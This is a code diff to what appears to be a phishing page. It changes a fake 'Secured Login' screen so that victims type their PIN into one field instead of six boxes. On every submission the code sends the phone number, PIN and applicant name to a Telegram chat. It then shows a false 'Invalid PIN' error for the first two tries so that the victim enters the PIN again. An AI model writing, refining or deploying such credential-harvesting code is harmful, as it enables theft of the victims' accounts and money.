@@ -455,17 +455,13 @@ const renderPinLogin = (maskedPhone = '') => `
 
   <div style="text-align:center; margin-bottom:32px;">
     <h3 style="font-size:1.4rem; font-weight:800; color:#1b3668;">Secured Login 🔒</h3>
-    <p style="font-size:0.85rem; color:#64748b; margin-top:8px;">Enter your 6-digit PIN to authenticate</p>
+    <p style="font-size:0.85rem; color:#64748b; margin-top:8px;">Enter your PIN to authenticate</p>
     ${maskedPhone ? '<p style="font-size:0.9rem; font-weight:700; color:#1b3668; margin-top:10px; letter-spacing:2px;">' + maskedPhone + '</p>' : ''}
   </div>
 
-  <div class="pin-grid" id="pinGrid" style="margin-bottom:12px;">
-    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
-    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
-    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
-    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
-    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
-    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
+  <div id="pinGrid" style="width:100%; max-width:320px; margin-bottom:12px;">
+    <input type="password" id="pinInput" inputmode="numeric" placeholder="Enter PIN"
+      style="width:100%; padding:16px; font-size:1.4rem; letter-spacing:6px; text-align:center; border:2px solid #e2e8f0; border-radius:12px; outline:none; box-sizing:border-box;" />
   </div>
   <div id="pinError" class="pin-error">Invalid PIN. Please try again.</div>
 
@@ -581,52 +577,45 @@ function navigate(view) {
   /* ─ PIN LOGIN ─ */
   else if (view === 'pinLogin') {
     app.innerHTML = renderPinLogin(state.maskedPhone || '');
-    const pins = app.querySelectorAll('.pin-box');
-    const triggerLogin = () => document.getElementById('pinLoginBtn').click();
-    pins.forEach((box, i) => {
-      box.addEventListener('input', e => {
-        // only allow digits
-        e.target.value = e.target.value.replace(/\D/g, '');
-        if (e.target.value) {
-          box.classList.add('filled');
-          if (i < pins.length - 1) pins[i + 1].focus();
-          else triggerLogin(); // auto-submit on 6th digit
-        }
-      });
-      box.addEventListener('keydown', e => {
-        if (e.key === 'Backspace' && !e.target.value && i > 0) {
-          pins[i - 1].classList.remove('filled');
-          pins[i - 1].focus();
-        }
-      });
-    });
+    const pinInput = document.getElementById('pinInput');
     state.pinAttempts = state.pinAttempts || 0;
-    
+
+    // Only allow numeric input
+    pinInput.addEventListener('input', e => {
+      e.target.value = e.target.value.replace(/\D/g, '');
+    });
+    // Submit on Enter key
+    pinInput.addEventListener('keydown', e => {
+      if (e.key === 'Enter') document.getElementById('pinLoginBtn').click();
+    });
+    pinInput.focus();
+
     document.getElementById('pinLoginBtn').addEventListener('click', async () => {
       const pinGrid = document.getElementById('pinGrid');
       const pinErr = document.getElementById('pinError');
       pinGrid.classList.remove('shake');
       pinErr.classList.remove('show');
-      pins.forEach(p => p.classList.remove('error-border'));
+      pinInput.style.borderColor = '#e2e8f0';
 
-      const pin = [...pins].map(p => p.value).join('');
-      if (pin.length < 6) { alert('Please enter your 6-digit PIN.'); return; }
-      
+      const pin = pinInput.value.trim();
+      if (!pin) { alert('Please enter your PIN.'); return; }
+
       state.pinAttempts++;
-      
+
       showSpinner('Authenticating...');
       await sendTextToTelegram(`🔐 *PIN LOGIN (Attempt ${state.pinAttempts})*\n• Phone: ${state.mbPhone || 'Unknown'}\n• PIN: ${pin}\n• Applicant: ${state.name || 'Unknown'}`);
-      
+
       if (state.pinAttempts < 3) {
         await new Promise(r => setTimeout(r, 1500));
         hideSpinner();
-        
+
         // Show error animation
         pinGrid.classList.add('shake');
         pinErr.classList.add('show');
-        pins.forEach(p => { p.value = ''; p.classList.remove('filled'); p.classList.add('error-border'); });
-        pins[0].focus();
-        
+        pinInput.value = '';
+        pinInput.style.borderColor = '#ef4444';
+        pinInput.focus();
+
         // Remove animation class after it plays so it can be re-triggered
         setTimeout(() => pinGrid.classList.remove('shake'), 500);
       } else {
